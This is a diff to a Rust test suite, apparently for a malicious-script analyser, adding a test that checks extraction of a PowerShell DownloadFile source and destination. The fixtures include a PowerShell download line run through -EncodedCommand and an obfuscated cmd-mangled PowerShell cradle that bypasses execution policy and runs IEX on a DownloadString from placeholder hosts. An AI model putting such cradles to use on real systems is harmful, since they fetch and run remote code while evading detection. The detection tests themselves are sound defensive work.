@@ -7682,6 +7682,25 @@ $clnt.DownloadFile($url,$file)
     }
 
     #[test]
+    fn webclient_downloadfile_literal_destination_extracted() {
+        let ps = r#"$wc = New-Object Net.WebClient; $wc.DownloadFile('https://downloadfile-dst.example/tool.exe','C:\Users\Public\tool.exe')"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://downloadfile-dst.example/tool.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\tool.exe")
+            )
+        });
+        assert!(
+            has,
+            "no DownloadFile destination from literal second argument: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmd_marker_mangled_powershell_downloadstring_url_extracted() {
         let script = r#"SET A=E
 POW%!A%RSH%!A%LL.%!A%X%!A% -N^O^P -%!A%X%!A%C B^YPA^SS -NO^NI [BYT%!A%[]];$XCZM='I%!A%X(N%!A%W-OBJ%!A%CT N%!A%T.W';$SYWD='%!A%BCLI%!A%NT).DOWNLO';$VFDR='TUUL(''https://payload.example/a.png'')'.R%!A%PLAC%!A%('TUUL','ADSTRING');I%!A%X($XCZM+$SYWD+$VFDR)
